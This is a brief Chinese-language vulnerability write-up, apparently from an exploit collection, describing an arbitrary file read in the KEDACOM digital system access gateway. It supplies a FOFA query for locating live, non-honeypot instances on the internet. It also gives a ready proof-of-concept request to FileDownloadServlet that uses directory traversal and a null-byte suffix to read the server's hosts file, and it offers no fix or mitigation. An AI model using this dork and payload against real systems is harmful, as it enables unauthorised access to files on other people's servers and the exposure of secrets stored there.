# KEDACOM 数字系统接入网关 任意文件读取漏洞

## 漏洞描述

KEDACOM 数字系统接入网关 存在任意文件读取漏洞，攻击者通过构造请求可以读取服务器任意文件

## 漏洞影响

> [!NOTE]
>
> KEDACOM 数字系统接入网关

## FOFA

> [!NOTE]
>
> (app="KEDACOM-DVR接入网关") && (is_honeypot=false && is_fraud=false)

## 漏洞复现

登录页面如下

![](image/ked-1.png)

使用POC读取 /etc/hosts

```
/gatewayweb/FileDownloadServlet?fileName=pq.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2
```

![](image/ked-2.png)